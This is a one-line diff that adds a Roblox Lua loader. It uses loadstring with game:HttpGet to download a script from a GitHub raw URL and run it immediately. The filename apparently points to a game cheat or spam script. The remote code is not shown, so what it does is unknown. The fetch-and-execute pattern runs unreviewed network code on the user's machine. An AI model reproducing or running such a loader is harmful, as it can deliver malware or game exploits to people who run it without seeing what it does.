@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/upd-8-cvr-retro-spam4-na96e5j6jldqb6.lua"))()
